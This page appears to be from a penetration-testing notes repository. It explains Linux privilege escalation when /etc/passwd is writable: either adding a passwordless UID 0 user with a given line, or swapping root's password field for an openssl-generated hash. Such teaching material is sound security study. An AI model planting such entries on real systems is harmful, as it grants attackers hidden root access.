# /etc/passwd
If we have write permissions in the `/etc/passwd` file we can perform two different types of attack.
1. [Creating a new user.](#creating-a-new-user)
2. [Changing root password.](#changing-root-password)



![0](https://github.com/PentesterArchive/Privilege-Escalation/assets/161533623/4f6daac4-2309-42c9-a56c-659b7b8e4ee7)


## Creating a new user. 
We can just write a new user with root privileges.<br />
`pentester:` -> Username.<br />
`:::` -> No password.<br />
`0:` -> User ID (UID). If UID = 0 means that our user has superuser privileges.<br />
`0:` -> Group ID (GID). If GID = 0 means that we are part of the root group.<br />
`,,,::` -> Empty camps.<br />
`/:` -> Home directory.<br />
`/bin/bash` -> User shell.<br />
```bash
pentester::0:0:,,,:/:/bin/bash
```



![1](https://github.com/PentesterArchive/Privilege-Escalation/assets/161533623/2fac5e71-2c05-43f3-b1ad-8ae80b4cbdf0)


![2](https://github.com/PentesterArchive/Privilege-Escalation/assets/161533623/44e76eb7-0475-48a7-870f-20266e2fa59f)




### Changing root password.
The second technique we are going to exploit is very similar. The difference between them resides in the fact that instead of creating a new user, this time we are going to change root password. 
In our local machine we are going to execute `openssl` to create the new password:
```
openssl passwd <newPassword>
```
![4](https://github.com/PentesterArchive/Privilege-Escalation/assets/161533623/38d831ea-b1bc-42a6-8896-3756da2ca869)



And then we just have to switch the `x` in the password field.

![5](https://github.com/PentesterArchive/Privilege-Escalation/assets/161533623/b2f4fe37-8f7b-42c4-a4fc-cb81b1898e17)


![6](https://github.com/PentesterArchive/Privilege-Escalation/assets/161533623/4187491e-310e-4652-b2c7-65c03303042b)


